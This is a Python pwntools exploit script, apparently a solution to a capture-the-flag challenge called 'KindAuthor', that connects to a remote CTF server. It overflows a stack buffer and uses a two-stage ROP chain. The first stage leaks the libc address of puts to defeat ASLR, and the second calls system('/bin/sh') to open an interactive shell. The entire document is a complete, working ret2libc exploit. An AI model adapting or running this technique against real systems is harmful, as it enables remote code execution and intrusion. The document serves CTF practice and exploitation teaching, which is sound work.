from pwn import *

# Set the context for the target architecture
context.arch = 'amd64'

# Load the ELF files for the binary and libc
# This allows pwntools to automatically find symbols, gadgets, etc.
elf = ELF("./KindAuthor")
libc = ELF("./libc.so.6")

# Use this for local testing
# Make sure to run with the provided loader and libc
#p = process(["./ld-linux-x86-64.so.2", "./KindAuthor"], env={"LD_PRELOAD": "./libc.so.6"})

# Connect to the remote server
p = remote("ctf.mf.grsu.by", 9075)

# --- Stage 1: Leak libc address ---

# Find the offset to the return address.
# 32 bytes for the buffer + 8 bytes for the saved RBP
offset = 40 

# Find a "pop rdi; ret" gadget in the binary. This is used to set up arguments for function calls.
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

# We also need a simple 'ret' gadget for stack alignment in the second stage.
ret_gadget = rop.find_gadget(['ret']).address

log.info(f"pop rdi; ret gadget found at: {hex(pop_rdi)}")

# Addresses from the binary's ELF file (fixed because PIE is off)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main'] # Address to return to for the second payload

log.info(f"puts@plt: {hex(puts_plt)}")
log.info(f"puts@got: {hex(puts_got)}")
log.info(f"main address: {hex(main_addr)}")

# Build the first ROP chain to leak the address of puts
# 1. Fill the buffer with junk
# 2. `pop rdi; ret` -> to load the argument for puts
# 3. `puts@got` -> the argument for puts (its own GOT entry)
# 4. `puts@plt` -> call puts to print the address
# 5. `main` -> return to main to send the second payload
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

# Send the first payload
p.sendlineafter(b"data:", payload1)

# The server returns "Hello\nInput your data:" again, but before that, it prints the leaked address.
# We need to skip the first line of output from the restarted main function.
p.recvline() 

# Receive the leaked address, unpack it, and strip trailing null bytes/newlines
leaked_puts_raw = p.recvline().strip()
leaked_puts = u64(leaked_puts_raw.ljust(8, b'\x00'))
log.success(f"Leaked puts@libc address: {hex(leaked_puts)}")

# --- Stage 2: Calculate addresses and get a shell ---

# Calculate the base address of libc in memory
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Calculated libc base address: {hex(libc.address)}")

# Calculate the real addresses of system() and the "/bin/sh" string
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the second ROP chain to call system("/bin/sh")
# 1. Fill the buffer with junk
# 2. `ret` gadget -> This is important for 16-byte stack alignment required by some libc functions like system.
# 3. `pop rdi; ret` -> to load the argument for system
# 4. `/bin/sh` address -> the argument for system
# 5. `system` address -> call system to pop a shell
payload2 = b'A' * offset
payload2 += p64(ret_gadget) # For stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

# Send the second payload
p.sendlineafter(b"data:", payload2)

# We should now have a shell
p.interactive()
